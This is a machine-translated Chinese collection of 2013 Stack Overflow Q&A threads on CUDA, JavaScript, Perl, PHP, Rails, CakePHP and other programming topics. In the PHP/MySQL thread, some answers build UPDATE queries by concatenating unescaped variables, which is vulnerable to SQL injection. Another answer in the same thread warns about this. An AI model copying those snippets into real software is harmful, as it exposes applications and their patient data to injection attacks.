2.  我想知道积木。每次我打电话`kernel_foo<<<A, 512>>>`时，并行进行多少计算以及如何进行？我的意思是它是一个接一个地完成还是块也并行化？如果是，那么有多少块可以并行运行 512 个线程？[这里](http://www.cc.gatech.edu/~vetter/keeneland/tutorial-2012-02-20/06-cuda-overview.pdf)说一个块在一个CUDA SM上运行，那么12个块可以同时运行是真的吗？如果是，当所有 12 个块同时运行时，每个块最多可以有多少个线程，8、96 或 512 个同时运行？（请参阅下面的 device_query）。

3.  另一个问题是，如果`A`值约为 50，将内核启动为`kernel_foo<<<A, 512>>>`还是更好`kernel_foo<<<512, A>>>`？假设不需要线程同步。

抱歉，这些可能是基本问题，但有点复杂... 可能重复：
[流式多处理器、块和线程 (CUDA)](https://stackoverflow.com/q/3519598)
[CUDA 块/扭曲/线程如何映射到 CUDA 核心？](https://stackoverflow.com/q/10460742)

谢谢

这是我的`device_query`：

```
Device 0: "Quadro FX 4600"
CUDA Driver Version / Runtime Version          4.2 / 4.2
CUDA Capability Major/Minor version number:    1.0
Total amount of global memory:                 768 MBytes (804978688 bytes)
(12) Multiprocessors x (  8) CUDA Cores/MP:    96 CUDA Cores
GPU Clock rate:                                1200 MHz (1.20 GHz)
Memory Clock rate:                             700 Mhz
Memory Bus Width:                              384-bit
Max Texture Dimension Size (x,y,z)             1D=(8192), 2D=(65536,32768), 3D=(2048,2048,2048)
Max Layered Texture Size (dim) x layers        1D=(8192) x 512, 2D=(8192,8192) x 512
Total amount of constant memory:               65536 bytes
Total amount of shared memory per block:       16384 bytes
Total number of registers available per block: 8192
Warp size:                                     32
Maximum number of threads per multiprocessor:  768
Maximum number of threads per block:           512
Maximum sizes of each dimension of a block:    512 x 512 x 64
Maximum sizes of each dimension of a grid:     65535 x 65535 x 1
Maximum memory pitch:                          2147483647 bytes
Texture alignment:                             256 bytes
Concurrent copy and execution:                 No with 0 copy engine(s)
Run time limit on kernels:                     Yes
Integrated GPU sharing Host Memory:            No
Support host page-locked memory mapping:       No
Concurrent kernel execution:                   No
Alignment requirement for Surfaces:            Yes
Device has ECC support enabled:                No
Device is using TCC driver mode:               No
Device supports Unified Addressing (UVA):      No
Device PCI Bus ID / PCI location ID:           2 / 0 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:45:49.097

查看[此答案](https://stackoverflow.com/a/2213744/214473)以获取一些初步指示！答案有点过时了，因为它谈论的是具有 1.x 计算能力的较旧 GPU，但无论如何它都与您的 GPU 相匹配。较新的 GPU（2.x 和 3.x）具有不同的参数（每个 SM 的内核数等），但是一旦您了解线程和块的概念以及超额订阅以隐藏延迟的概念，这些更改很容易理解。

此外，您可以参加[Udacity 课程](https://www.udacity.com/course/cs344)或[Coursera 课程](https://www.coursera.org/course/hetero)来开始学习。

# java - 检查java中excel列的唯一性

> ID：14832174
> 
> 赞同：0
> 
> 时间：2013-02-12T12:05:22.227
> 
> 标签：java, excel, apache-poi

我正在使用 Apache POI API 从我的 Web 应用程序中上传的 excel（.xls 或 .xlsx）文件中提取数据。现在我想验证工作表的特定列是否应该包含唯一数据（没有重复的条目）。

是否可以在开始实际提取数据之前检查唯一性（目的只是减少计算量）？我可以在提取后执行此操作，因为我将该列放在一组中。

或者有没有其他方法可以做这种事情？你能给我解决方案或把我送到正确的方向吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:21:24.060

你应该看看[AutoFilter](http://poi.apache.org/apidocs/org/apache/poi/ss/usermodel/AutoFilter.html)。

从文档中：

> 例如，您可以筛选以仅查看您指定的值，筛选以查看最高或最低值，或筛选以快速查看重复值。

# javascript - 如何将onclick属性设置为动态生成的输入框

> ID：14832175
> 
> 赞同：0
> 
> 时间：2013-02-12T12:05:22.757
> 
> 标签：javascript, dom

最初，我有一个表，其中包含一定数量的行和一些包含`input`带有单击事件处理程序的控件的列。

当我将行动态添加到表中时，如何将 onclick 属性设置为`input`动态生成的行的控件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:07:19.117

你应该使用这样的东西：

```
var input = document.createElement('input');
input.type = 'button';
cell.appendChild(input);
input.onclick = function () {
   alert('Clicked!');
}; 
```

这是[jsfiddle](http://jsfiddle.net/J3zxB/)中的一个示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:12:22.683

假设

1.  你正在使用 jquery

2.  在某些条件下，一些 jquery 块正在添加更多元素。

jquery[`live`](http://api.jquery.com/on/)和更好的[`on`](http://api.jquery.com/on/)功能可以帮助您。

```
$('input.yourClass').live('click', function(e) {
  // your code
}); 
```

或者

```
$(document).on('click', 'yourClass', function(e) {
// your code
}); 
```

应该做的伎俩。

如果您不使用 jquery，生活可能会有点困难！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:29:16.877

您可以使用以下代码获取文档中的所有输入元素并对其进行操作：

```
for (a in each=document.getElementsByTagName('input')) { 
console.log(each[a])
) } 
```

# jquery - 将 SVG Rect x,y 转换为屏幕左侧和顶部 jQuery SVG

> ID：14832176
> 
> 赞同：1
> 
> 时间：2013-02-12T12:05:24.773
> 
> 标签：jquery, svg, position, google-visualization

我正在使用谷歌可视化来生成一些柱形图，为显示添加趣味我想使用一些自定义文本和图像更改注释，为此我需要获取每个注释的确切顶部和左侧位置

目前，我只是在经过一系列试验和错误后应用一些随机值，以使布局接近我正在寻找的

我想知道是否可以将注释的 x,y 值转换为屏幕左侧和顶部值，这样我就可以获得所需的布局。

请参阅此链接 [http://www.screencast.com/t/f0ytn2m0IS](http://www.screencast.com/t/f0ytn2m0IS)

带有 230 等值的橙色小图标应该与折线图对齐

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-14T10:59:45.810

您可以查看此答案“[我如何绝对定位 SVG 中的文本](https://stackoverflow.com/questions/5993570/how-can-i-absolutely-orient-text-in-svg/6049080#6049080)”。[您可以使用该答案中的代码](https://svn.apache.org/repos/asf/commons/sandbox/gsoc/2010/scxml-js/trunk/src/javascript/scxml/cgf/util/svg.js)创建 jQuery 插件。

```
$.fn.getRealBBox = function() {
    if (this[0] instanceof SVGElement) {
        return getBoundingBoxInArbitrarySpace(this[0], this[0].getCTM());
    } else {
        throw "selector '" + this.selector + "' is not SVGElement";
    }
}; 
```

并使用它来获取 x 和 y，然后您可以将对象顶部设置为这些值，如果您希望 html 对象位于中间，只需添加`box.width/2`and `box.height/2`。

# navigation - Zend Framework 2 Navigation Sub-Sub 菜单

> ID：14832177
> 
> 赞同：6
> 
> 时间：2013-02-12T12:05:25.340
> 
> 标签：navigation, zend-framework2

假设我有以下导航：

```
Home
Internal
    Folders
        New Folder
    Configuration
        Categories
            New
        Tags
            New
        Options
            New
    Contact
External 
```

我在 layout.phtml 中使用的代码来显示这个菜单：

```
$internal = $this->navigation('navigation')->findOneByLabel('Internal');
echo $this->navigation('navigation')
          ->menu()
          ->setUlClass('nav nav-list')
          ->setMaxDepth(1)
          ->renderMenu($internal); 
```

所以它显示如下：

```
Folders
    New Folder
Configuration
    Categories
    Tags
    Options
Contact 
```

目前我得到了一个不错的菜单，显示了所有的父母和第一个孩子，所以“新”导航永远不会显示。

但是，如果我在“类别”页面上，我也想显示他们的孩子，所以应该显示“类别”下的“新”，如下所示：

```
Folders
    New Folder
Configuration
    Categories
        New
    Tags
    Options
Contact 
```

我尝试了很多方法来尝试这个，并检查了所有选项（setMinDepth、setMaxDepth、renderSubMenu、setParentMenu），你可以在 layout.phtml 中给菜单，但没有成功。它要么包含“新”，要么不包含，而不是介于两者之间。

除了制作部分菜单外，关于 ZF2 的文档没有给我任何关于如何让这个子菜单工作的信息。

那么，制作局部是唯一的选择吗？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T21:54:51.293

对于不久前的一个小项目，我做了一个非常快速的修复。我们一直在计划清理代码并使其可配置，但我们从未进入另一个需要相同的项目。

TL;DR：您不能使用普通的 zf2 视图助手，但您必须查找要显示的“顶级”页面（在您的情况下为内部）并在该页面下方显示菜单。

```
<?php

namespace Application\View\Helper;

use Zend\View\Helper\AbstractHelper;

class SubNavigation extends AbstractHelper
{
    public function __invoke($class = null)
    {
        $view = $this->getView();
        $menu = $view->navigation()->menu();

        $container = $view->navigation()->getContainer();
        $active    = $view->navigation()->setRenderInvisible(true)->findActive($container);

        if (!$active) {
            return;
        }

        $container = $active['page'];
        $depth     = $active['depth'];

        while (0 !== $depth) {
            $container = $container->getParent();
            $depth--;
        }

        $visible = $container->isVisible();
        $html    = $menu->setContainer($container->setVisible(true))
                        ->setUlClass('')
                        ->setOnlyActiveBranch(false)
                        ->setMinDepth(null)
                        ->setMaxDepth(null)
                        ->render();

        $container->setVisible($visible);

        if (strlen($html)) {
            return sprintf('<ul %s><li%s><a href="%s">%s</a>%s</li></ul>',
                    (null !== $class) ? ' class="' . $class . '"' : null,
                    ($container->isActive())? ' class="active"' : null,
                    $container->getHref(),
                    $container->getLabel(),
                    $html);
        }
    }
} 
```

此视图助手将“内部”呈现为调用中的顶部菜单项`sprintf()`，但您可以轻松更改此行为。你可以回声`$html`，然后它就是你真正需要的。

# ruby-on-rails - 如何在没有嵌套的情况下连接表单中的模型？

> ID：14832182
> 
> 赞同：0
> 
> 时间：2013-02-12T12:05:36.497
> 
> 标签：ruby-on-rails

我对这个问题进行了很多搜索并观看了很多教程（例如 railscast：嵌套模型表单），但恐怕这不是解决我问题的正确方法。

我想为理论收集数据。这个理论有许多问题需要用独特的卡片来回答。我总是想显示所有问题（在所有卡片上），但答案可能会有所不同，具体取决于每张卡片。因此，我需要捕获 question_id 和 card_id，但是深度嵌套和通过参数捕获 id 会很痛苦。有谁知道我的问题的更好解决方案？

这是我的模型：

**理论.rb**

```
class Theory < ActiveRecord::Base

has_many :cards
has_many :questions 
```

**卡片.rb**

```
class Card < ActiveRecord::Base

belongs_to :theory
has_many :answers
has_many :questions  (Do I need this here - I always want to display all questions?) 
```

**问题.rb**

```
class Question < ActiveRecord::Base

belongs_to :theory
has_many :answers 
```

**答案.rb**

```
class Answer < ActiveRecord::Base

belongs_to :card
belongs_to :question 
```

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T13:04:46.467

模型之间的关系不应取决于它们在屏幕上的显示方式。它们应该由它们实际上如何相互关联来确定。

我不完全理解应该代表什么理论/卡片，所以我不能告诉你需要存在哪些关系，但我可以尝试一下：

在我看来，一张卡片似乎代表了与特定理论相关的单个人的答案？如果是这样，那么您不需要“has_many :questions”，因为该卡只有答案。此外，每个答案都链接到一个问题，因此您可以通过答案“获取”问题。如果您真的想要卡片的问题列表，您可以在卡片模型中添加“has_many :questions, :through=>:answers”。

如果在完成任何回答之前每张卡片都可以添加一组不同的问题，那么您将需要“has_many :questions”，但如果所有问题都在每张卡片上，那么您就不需要它。

更新以回应您的以下评论：

一种方法是通过在控制器中构建答案来将答案添加到卡片中：

```
@card = Card.find 2
@theory = Theory.find 1

@theory.questions.each do |question|
   @card.answers.build :question=>question 
end 
```

然后在你看来做这样的事情（这是 HAML）：

```
 = form_for @card do |f|
   -@card.answers.each do |answer|
     =f.fields_for answer do |answer_form|
       =answer_form.hidden_field :question_id 
       %p=answer.question.full_question 
       %p=answer_form.text_field :input 
```

这是使用嵌套表单属性，因此要使其与您的 Card 模型一起使用，您必须将其添加到其中：

```
class Card < ActiveRecord::Base
  ..
  accepts_nested_attributes_for :answers
  ..
end 
```

# asp.net - 查找简单函数的发送者

> ID：14832183
> 
> 赞同：0
> 
> 时间：2013-02-12T12:05:41.063
> 
> 标签：asp.net, vb.net

有没有办法知道一个简单函数的发送者？

```
 Public Function functionA() As Integer
 functionB()
 End Function

 Public Function functionB() As Integer
 ' i need to do another processing if it comes from functionA

 End Function 
```

有任何想法吗 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:09:55.290

您的问题的解决方案是错误的。你不需要知道调用函数的名字，你需要重构你的代码（如果你想稍后重命名方法，或者从另一个方法调用它怎么办？）。

例如添加一个默认的布尔参数`false`，但`true`如果您从`FunctionA()`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:18:08.200

正如 CodeCaster 所说，您应该以不同的方式解决您的问题，这里有一个示例代码：

```
Public Function functionA() As Integer
    Call functionB(True)
End Function

Public Function functionB(Optional bFromA As Boolean = False) As Integer
    If bFromA Then
       ...
    Else
       ...
    End If

End Function 
```

您甚至可以创建自己的一组选项，以便使用不同的处理选项从不同的地方调用您的函数：

```
Public Enum OptionTypeB
    DefaultOpt
    OptionName1
    OptionName2
    OptionName3
End Enum

Public Function functionB(Optional bOptions As OptionTypeB = OptionTypeB.DefaultOpt) As Integer
    ....
End Function 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:06:57.963

```
Console.WriteLine(new StackFrame(1, true).GetMethod().Name); 
```

上面的代码应该给你调用方法的名字。

# javascript - JavaScript 单元测试。嘲笑什么？

> ID：14832188
> 
> 赞同：0
> 
> 时间：2013-02-12T12:05:48.970
> 
> 标签：javascript, unit-testing, qunit

我正在尝试在我的开发过程中引入单元测试，但我不知道该怎么做。

我有一个包含很多模块（分开的 js 文件）的大型应用程序。例如：

*   视频信息.js
*   可用视频.js
*   可用Channels.js
*   网络设置.js
*   …………

还有一些模块为其余的提供服务：

*   eventHandler.js
*   i18n.js
*   ajax.js
*   配置.js
*   auth.js
*   baseModule.js
*   ...........

问题是：如何测试像**videoInfo.js**这样使用所有服务模块的模块？我看到两种方法：

*   我只加载 videoInfo.js 并模拟所有内部接口。这样做的问题是，如果任何内部接口发生更改，我将不会捕获错误。
*   我加载所有模块（整个应用程序）并使用真实的应用程序环境测试 videoInfo（将模拟的外部 AJAX 调用除外）

当您有很多内部依赖项时，这样做的好方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T14:05:41.520

理想情况下，您希望在您的测试套件中使用这两种方法。

您想模拟所有依赖项（在您的 videoInfo.js 示例中），以便您可以将其代码与其他任何内容隔离，并确保它正常工作。根据您拥有的代码设计，这可能很困难。由于代码可能没有在编写时考虑到测试，因此不适合模拟。

您还希望拥有完整的应用程序级别系列测试，以确保各部分之间的所有交互都能正常工作。根据应用程序的不同，由于依赖于您无法控制的数据，这些测试可能非常脆弱。

这些测试可能会在单独的套件中，以便它们可以彼此独立地运行。

如果您刚刚开始编写代码测试，请尽可能编写最好的测试。测试是代码，应该随着你的进行而重构。尽可能编写最简单的测试。为遗留代码编写测试非常困难。当前的设计可能难以正确测试。因此，当您进行更改时，请尽您所能。

# playframework-2.0 - 在 Play Framework 2.x 中手动调用表单验证

> ID：14832189
> 
> 赞同：4
> 
> 时间：2013-02-12T12:05:52.803
> 
> 标签：playframework-2.0, playframework-2.1

我有一个带有几个约束注释的模型。是否可以使用该模型对象填充表单，然后手动调用验证。我正在寻找这样的东西：

```
models.Photo photo = new models.Photo();
photo.loadValues();
Form<models.Photo> photoForm = new Form<models.Photo>(models.Photo.class);
photoForm.fill(photo); 
```

然后我可以做这样的事情：

```
photoForm.validate(); #does not exist
if (photoForm.hasErrors) {
    ...
} 
```

**更新**：estmatic 的答案效果很好。要将对象转换为地图，我使用 Beanutils：

```
Map<String, String> photoMap = BeanUtils.describe(photo); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T16:50:37.747

代替`fill()`，您可以使用该`bind()`方法并将 a`Map`与您的预加载值一起传递。这将触发验证`bindFromRequest`。

```
Map<String,String> values = loadValues();
Form<models.Photo> photoForm = form(models.Photo.class).bind(values);
if (photoForm.hasErrors()){
  ...
} 
```

# git - git子模块或？- 单个文件依赖

> ID：14832190
> 
> 赞同：3
> 
> 时间：2013-02-12T12:05:54.080
> 
> 标签：git, github, gentoo

我正在尝试使用 github 来跟踪我自己的 portage 覆盖，并希望能够轻松地从上游文件存储库中包含和下拉更改。

问题是当我将它们拉下来时，我通常只需要来自远程源存储库的一个文件或少数几个文件，这些文件提供了我想要包含在我的存储库中的原始 ebuild 文件。

使用 git 跟踪上游源代码库但仅“部分”跟踪上游源代码库的最佳/推荐方法是什么？

示例：我想将git repo 的[这个特定文件夹](https://github.com/Lokaltog/powerline/tree/develop/packages/gentoo)中的内容包含到我自己的 git repo 中，而不包括 repo 的其余部分。

编辑：

包含 repo 的其余部分没有意义，因为 ebuild 只是安装说明，所以我不应该用非 ebuild 文件弄乱我的覆盖。并分叉我自己的仓库，删除他们的所有文件并不断只合并其中的一部分，然后使我的覆盖仓库的子模块看起来适得其反/过于复杂（并不是说它可能不是首选路线，我仍然不是当然我完全理解这些 git 大师的想法）

# perl - 为什么将 1 分配给哈希元素？

> ID：14832191
> 
> 赞同：-4
> 
> 时间：2013-02-12T12:05:54.337
> 
> 标签：perl, perl-data-structures, perl-hash

谁能解释一下这个语句在 Perl 中的作用

```
$type{$_->{brand}} = 1; 
```

我可以理解散列`%type`有一个`brand`保存对另一个散列的引用的键，`brand`并且**1 被分配给它**

这是什么意思？？！！！当它被分配为1？

```
package SillyFunction;

sub group_products {
    my $products = shift;
    my %brand_type = ();
    my $grouped_products = [];

    foreach (@{$products}) {
        $brand_type{ $_->{brand} } ||= {};
        $brand_type{ $_->{brand} }->{ $_->{type} } = 1;
    }

    foreach (sort keys %brand_type) {
        my $brand = $_;
        foreach (sort keys %{ $brand_type{$brand} }) {
            push(@{$grouped_products}, { brand => $brand, type => $_ });
        }
    }

    $grouped_products;
}
1; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T17:14:54.147

编码

```
$type{$_->{brand}} = 1; 
```

方法：

*   我们有一个散列类型的变量，名为`%hash`。
*   *主题变量* `$_`包含对哈希的*引用。*
*   我们访问在`brand`引用的哈希中调用的条目`$_`。我们记住了这个值。
*   我们使用刚刚在名为 的哈希中记住的名称访问条目`%hash`。
*   哈希元素是*左*值，即可以为它们分配一些东西。
*   我们将数字分配`1`到我们刚刚访问的哈希槽中。

注意事项：

*   在 Perl 中，散列是一种数据结构。其他语言将此称为*关联数组*。它将字符串映射到标量值。
*   散列函数计算给定字符串的特征数。散列数据结构在内部使用这样的函数，并且以 Perl 无法访问的方式。散列函数在密码学中也很重要。
*   操作员将右侧的`=`事物分配给左侧的事物。
*   那行代码没有一个关键字，只有变量 ( `%type`, `$_`)、常量 ( `'brand'`, `1`) 和运算符 ( `{...}`, `->`, `=`, `;`)。

这是您在评论中发布的代码，并带有注释：

```
# Declare a namespace "SillyFunction".
# This affects the full names of the subroutines, and some variables.
package SillyFunction;

# Declare a sub that takes one parameter.
sub group_products {
  my $products = shift;

  my %brand_type = ();       # %brand_type is an empty hash.
  my $grouped_products = []; # $grouped_products is a reference to an array

  # loop through the products.
  # The @{...} "dereferences" an arrayref to an ordinary array
  # The current item is in the topic variable $_
  foreach (@{$products}) {
    # All the items in $products are references to hashes.
    # The hashes have keys "brand" and "type".

    # If the entry if %brand_type with the name of $_->{brand} is false,
    # Then we assign an empty hashref.
    # This is stupid (see discussion below)
    $brand_type{$_->{brand}} ||= {};

    # We access the entry names $_->{brand}.
    # We use that value as a hashref, and access the entry $_->{type} in there.
    # We then assign the value 1 to that slot.
    $brand_type{$_->{brand}}->{$_->{type}} = 1;
  }

  # We get the names of all entries of %brand_type with the keys function
  # We sort the names alphabetically.
  # The current key is in $_
  foreach (sort keys %brand_type) {
    # We assign the current key to the $brand variable.
    # This is stupid.
    my $brand = $_;

    # We get all the keys of the hash referenced by $brand_type{$brand}
    # And sort that again.
    # The current key is in $_
    foreach (sort keys %{$brand_type{$brand}}) {
      # We dereference the ordinary array from the arrayref $grouped_products.
      # We add a hashref to the end that contains entries for brand and type
      push(@{$grouped_products}, { brand => $brand, type => $_});
    }
  }

  # We implicitly return the arrayref containing all brands and types.
  $grouped_products;
}

# We return a true value to signal perl that this module loaded all right.
1; 
```

这段代码有什么作用？它获取所有产品（产品是包含品牌和类型字段的 hashref），并主要按品牌排序，其次按类型，按字母升序排列。

在这样做的同时，作者产生了可怕的代码。以下是可以做得更好的地方：

*   他使用 arrayref 而不是数组。只使用数组并返回对它的引用会更容易：

    ```
    my @grouped_products;
    push @grouped_products, ...;
    return \@grouped_products; # reference operator \ 
    ```

*   在某些时候，分配了一个 hashref。这是不必要的，因为 Perl*会自动激活*用作散列或数组引用的未定义值。那条完整的线是没有用的。此外，仅当该值为 false 时才分配它。作者可能想要的是分配该值是否为*undefined*。`//`此处可以使用定义或运算符（仅从 perl5 v10 或更高版本开始）。

*   构建哈希哈希。这是浪费。数组的哈希会更好。
*   如果使用`for`or循环值`foreach`，则不必将当前项目*分配*给 cryptic `$_`。相反，可以指定一个循环变量：`foreach my $foo (@bar)`. 的默认行为`foreach`类似于`foreach local $_ (@bar)`。
*   隐式回报是不好的。

这是一段实现相同子例程的代码，但更失败——记住，我们只是想对产品进行排序（假设它们已经是唯一的）

```
sub group_products {
  my ($products) = @_;
  my @grouped =
    # sort by brand. If that is a draw, sort by type.
    sort { $a->{brand} cmp $b->{brand} or $a->{type} cmp $b->{type} }
    map  { +{%$_} } # make a copy.
    @$products;     # easy dereference
  return \@grouped;
} 
```

[**说明：**这段代码主要是自我记录的。该`sort`函数接受一个必须返回数字的块：“<code>$a 小于”为负数，“<code>$a 且相等”`$b`为零，或“<code>$a 大于”为正数`$b`比`$b`”。]

[运算符按字典顺序比较`cmp`操作数。如果品牌不同，那么我们不必比较类型。如果品牌相同，则第一个`cmp`返回`0`，这是一个错误值。因此，执行第二个比较（类型），并返回该值。这是按主键和辅助键排序的标准 Perl 习惯用法。]

[`sort`and`map`级联从右/下到左/上执行。]

如果不能保证唯一性，这样的事情会更好：

```
use List::MoreUtils qw/uniq/;
sub group_products {
  my ($products) = @_;
  my %grouping;
  push @{ $grouping{ $_->{brand} } }, $_->{type} for @$products;
  my @grouped;
  for my $brand (sort keys %grouping) {
    push @grouped, +{brand => $brand, type => $_} for sort uniq @{ $grouping{$brand} };
  }
  return \@grouped;
} 
```

[**解释：**我们定义了一个`%grouping`哈希（待填充）。对于每个产品，我们将该产品的类型添加到分组哈希中相应品牌的数组引用中。也就是说，我们收集每个品牌的所有类型。我们定义了一个包含所有分组产品（待填充）的数组。我们按字母顺序遍历所有品牌，然后按字母顺序遍历该品牌的所有独特产品。对于这些品牌/类型组合中的每一个，我们都会为分组的产品添加一个新的 hashref。该`uniq`功能是从优秀的`List::MoreUtils`模块中导入的。我们返回对分组产品数组的引用。]

# matlab - MATLAB 中的实时绘图

> ID：14832193
> 
> 赞同：0
> 
> 时间：2013-02-12T12:05:57.367
> 
> 标签：matlab, matrix, real-time

我有一个矩阵，其中包含通过 ODE 计算然后绘制的行星的计算运动数据，我需要分别绘制每个行星，是否可以通过使用 set 函数实时做到这一点一个矩阵，还是我必须相应地分解矩阵？（太阳、水星、金星、地球、火星、木星、土星、天王星、海王星、冥王星的 x、y、z 位置和速度有 60 列）我需要绘制的矩阵中的列是第一列每组六人中的三人

谢谢

克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T14:20:02.867

> 是否可以通过仅对一个矩阵使用 set 函数来实时执行此操作，还是我必须相应地分解矩阵？

这取决于您的绘图方式。

例如，如果您将所有行星定义为带有标记的线，那么您可以使用单个命令进行更新：

```
% create the line object
l = line(x,y,z,'color','r', 'linestyle', 'none', 'marker', '.', 'markersize', 20);

% update the positions
set(l,'XData', planetPositions(:,1), 'YData', planetPositions(:,2), 'ZData', planetPositions(:,3)); 
```

但是，如果行星是单独绘制的，那么您需要一一更新它们的位置。

# php - 打印 array.under 数组的值

> ID：14832199
> 
> 赞同：0
> 
> 时间：2013-02-12T12:06:18.463
> 
> 标签：php, arrays, wordpress, recursion

我必须打印数组写入值的所有值。

```
[subscriber] => Array
    (
        [name] => Subscriber
        [capabilities] => Array
            (
                [read] => 1
                [level_0] => 1
            )
        [default] => Array
            (
                [deft] => Array (
                              [one] => 2
                              [two] => 3
                        )
                [deft_one] => Array (
                               [one] => t
                               [two] => h
                        )
            )

    ) 
```

我必须打印数组下的每个值。所以我使用了递归函数。但我不能得到结果。请帮助我递归函数。

对不起，我一直在努力。实际上我必须打印 wp-option 表值。有很多序列化数组。我想单独打印所有值。我的意思是当我使用下面编写的代码时，我得到了一个数组。

```
function option_value_change () {
  global $wpdb;
  $myrows = $wpdb->get_results( "SELECT *
  FROM `wp_options`");
    $temp_url = get_option('siteurl');
    $site_url = get_site_url();
    foreach ($myrows as $rows){
      $option = get_option($rows->option_name);
                //print_r($option);
        get_option_value($option);
    }
} 
```

我可以拿到桌子。但是在一个数组中。哪个数组有数组。所以我使用了一个函数“get_option_value($option)”。如下所述

```
function get_option_value($option) {
    if(!is_object($option) && !is_array($option)){
        echo $option;
    }
    else{
            foreach($option as $option_value){
                if(!is_array($option_value)){
                    echo $option_value;
                }
                else {
                    get_option_value($option_value);

                }
            }
    }
} 
```

但我无法获得所有价值。它给出一个错误

```
Object of class stdClass could not be converted to string. 
```

那么如何打印数组的所有值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:23:12.140

您可以使用`RecursiveArrayIterator`示例：

```
$data = array(
  'subscriber' => array(
    'name' => 'Subscriber',
    'capabilities' => array(
      'read' => 1,
      'level_0' => 1,
    ),
    'default' => array(
      'deft' => array(
        'one' => 2,
        'two' => 3,
      ),
      'deft_one' => array(
        'one' => 't',
        'two' => 'h',
      ),
    ),
  ),
);

echo "<pre>";
$it = new RecursiveIteratorIterator(new RecursiveArrayIterator($data));
foreach($it as $var)
{
    echo $var , PHP_EOL ;
} 
```

输出

```
Subscriber
1
1
2
3
t
h 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:17:48.207

我没有测试它，但你可以明白；

```
function printArr($obj){

    if(!is_array($obj)){

        echo $obj;
        return;
    }
    else if(is_array($obj)){

        foreach ($obj as $key => $value) {
            printArr($obj[$key]);
        }
    }
} 
```

# php - MYSQL 和 PHP 意外错误

> ID：14832200
> 
> 赞同：0
> 
> 时间：2013-02-12T12:06:20.367
> 
> 标签：php, mysql

我是 PHP 和 MySQL 的新手，我正在努力解决以下问题：

```
$sql = "UPDATE Pharm_Log set text = ". $bloodtest . " WHERE patient = " . $patientid .;
    if(is_resource($sql) and mysql_num_rows($sql)>0){ 
```

当我尝试关闭我的 SQL 语句时会出现问题。我知道这与括号和分号有关，但是每次我更改一件事时，都会弄乱另一件事。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:15:58.803

首先，删除第一行的最后一个点，因为最后没有连接任何字符串。应该是这样的：

```
$sql = "UPDATE Pharm_Log set text = ". $bloodtest . " WHERE patient = " . $patientid; 
```

您是否正在对 SQL 服务器进行查询？如果不是，则该变量`$sql`不执行任何操作，因此添加：

```
$result = mysql_query($sql); 
```

并更改您的最后一行代码以处理查询结果

```
if(is_resource($result) && mysql_num_rows($result) > 0) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:09:16.913

删除分号前的点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:08:51.317

以下是您需要做的事情：

*   删除分号前的最后一个句点
*   用单引号包裹字符串文字
*   使用执行查询`mysql_query`

代码：

```
$sql = "UPDATE Pharm_Log set text = '$bloodtest'  WHERE patient = " . $patientid;
$result = mysql_query($sql);
if(is_resource($result ) and mysql_num_rows($result )>0) { ... } 
```

作为旁注，[`SQL Injection`](http://bobby-tables.com/)如果变量的值（*s*）来自外部，则查询很容易受到攻击。请看下面的文章，了解如何预防。通过使用`PreparedStatements`，您可以摆脱在值周围使用单引号。

*   [如何*防止*PHP 中的 SQL 注入？](https://stackoverflow.com/questions/60174/how-to-prevent-sql-injection-in-php)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-12T12:11:57.320

是的，它是`.`导致语法错误的最后一个。另外，您需要将非 int 值括在引号中，另外重要的是不要忘记添加 mysql_real_escape_string 否则会出现问题，您还应该使用 PDO 或 mysqli 与准备好的查询。

```
<?php 
$sql = "UPDATE Pharm_Log 
        SET `text`='".mysql_real_escape_string($bloodtest)."' 
        WHERE patient = '".mysql_real_escape_string($patientid)."'";
?> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-12T12:09:34.823

你最后不需要`.`。改成，

```
$sql = "UPDATE Pharm_Log set text = ". $bloodtest . " WHERE patient = " . $patientid; 
```

# cakephp - CakePHP 2.2.4 无法使用 HAVING 子句和计算字段对结果进行分页 - Haversine 公式

> ID：14832201
> 
> 赞同：1
> 
> 时间：2013-02-12T12:06:21.927
> 
> 标签：cakephp, pagination, having, clause, haversine

在使用 CakePHP 2.2.4 中的半正弦公式计算距离时，我试图对结果列表进行分页，但在 having 子句中的计算字段周围出现错误。

我认真地花了数周时间试图弄清楚这一点，但我做不到。我已经阅读了几篇文章，有些说我需要覆盖计数方法，有些说尝试其他但与旧版本的 Cake 相关的东西。

有人可以告诉我我需要做什么才能让这个工作吗**？**一定有数百人试图实现同样的目标并取得成功！

我正在使用的代码是：

```
'Business' => array(
        'conditions' => array(
            'Business.is_active' => 1
        ),
        'fields' => array(
            'Business.*',
            '( 6371 * acos( cos( radians(' . $location['Location']['latitude'] . ') ) * cos( radians( Business.latitude ) ) * cos( radians( Business.longitude ) - radians(' . $location['Location']['longitude']  . ') ) + sin( radians(' . $location['Location']['latitude']  . ') ) * sin( radians( Business.latitude ) ) ) ) AS distance'
        ),
        'group' => array(
            'Business.id HAVING distance <= 5',
        ),
        'contain' => array(
            'UserReview',
            'Certification',
            'Package' => array(
                'MassageType',
                'PackageVariation' => array(
                    'order' => array(
                        'cost_in_dollars' => 'ASC'
                    )
                )
            )
        ),
        'order' => array(
            'distance' => 'ASC',
